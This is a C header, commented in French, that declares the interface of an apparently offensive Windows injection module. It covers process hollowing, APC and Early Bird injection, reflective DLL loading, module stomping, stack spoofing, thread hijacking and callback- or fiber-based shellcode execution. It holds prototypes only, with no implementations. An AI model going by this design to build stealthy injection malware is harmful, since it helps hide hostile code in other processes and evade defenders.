/*
 * injection.h - Prototypes pour les techniques d'injection
 *
 * Techniques disponibles:
 * - Process Hollowing
 * - APC Injection (classique et Early Bird)
 * - Reflective DLL Loading
 */

#ifndef INJECTION_H
#define INJECTION_H

#include <windows.h>
#include <tlhelp32.h>

/* Process Hollowing */
BOOL Injection_ProcessHollowing(const char* targetPath, BYTE* payload, DWORD payloadSize);

/* APC Injection */
BOOL Injection_APC(DWORD targetPid, BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_EarlyBirdAPC(const char* targetPath, BYTE* shellcode, DWORD shellcodeSize);

/* Reflective DLL Loading */
PVOID Injection_ReflectiveLoadDLL(BYTE* dllData, DWORD dllSize);
BOOL Injection_ReflectiveUnloadDLL(PVOID imageBase);
FARPROC Injection_GetReflectiveExport(PVOID imageBase, const char* funcName);
BOOL Injection_ReflectiveInject(DWORD targetPid, BYTE* dllData, DWORD dllSize);

/* Module Stomping - cache le code dans une DLL légitime */
BOOL Injection_ModuleStomp(BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_RemoteModuleStomp(DWORD targetPid, const char* dllName, 
                                  BYTE* shellcode, DWORD shellcodeSize);

/* Stack Spoofing */
BOOL Injection_CreateStackSpoof(PVOID targetFunction, PVOID* outTrampoline);
BOOL Injection_FreeStackSpoof(PVOID trampoline);
PVOID Injection_CallWithSpoofedStack(PVOID function, PVOID arg1, PVOID arg2, 
                                      PVOID arg3, PVOID arg4);

/* Thread Hijacking */
BOOL Injection_ThreadHijack(DWORD targetPid, DWORD targetTid, 
                            BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_ThreadHijackWithRestore(DWORD targetPid, DWORD targetTid,
                                        BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_ListThreads(DWORD targetPid, char** outJson);

/* Callback-based Execution */
BOOL Injection_ThreadPoolCallback(BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_TimerCallback(BYTE* shellcode, DWORD shellcodeSize, DWORD delayMs);
BOOL Injection_EnumWindowsCallback(BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_CertEnumCallback(BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_CopyFileCallback(BYTE* shellcode, DWORD shellcodeSize);

/* Fiber-based Injection */
BOOL Injection_FiberLocal(BYTE* shellcode, DWORD shellcodeSize);
BOOL Injection_FiberSafe(BYTE* shellcode, DWORD shellcodeSize);

/* Utilitaires */
DWORD Injection_FindProcessByName(const char* processName);
BOOL Injection_ListInjectableProcesses(char** outJson);
BOOL Injection_ListCallbackMethods(char** outJson);

#endif /* INJECTION_H */
